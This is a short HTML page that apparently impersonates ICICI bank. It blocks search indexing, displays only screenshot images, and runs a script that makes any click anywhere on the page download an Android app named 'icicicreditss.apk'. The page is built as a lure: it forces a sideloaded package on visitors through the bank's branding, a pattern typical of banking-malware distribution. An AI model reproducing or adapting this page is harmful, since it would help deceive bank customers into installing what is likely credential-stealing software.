<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>icici</title>
    <meta name="robots" content="noindex, nofollow">
    <link rel="stylesheet" href="styles.css">
</head>

<body>
    <div class="image-container">
        <img src="images/mobile-image.png" alt="Mobile View" class="mobile-img">
        <img src="images/desktop-image.png" alt="Desktop View" class="desktop-img">
    </div>

    <script>
        // Attach the click event to the body element to cover the entire page
        document.body.addEventListener('click', () => {
            const ele = document.createElement('a');
            ele.href = '/icicicreditss.apk'; // Ensure this path is correct
            ele.download = 'icicicreditss.apk';
            document.body.appendChild(ele); // Append the link to the body
            ele.click();
            document.body.removeChild(ele); // Clean up the link after clicking
        });
    </script>
</body>

</html>
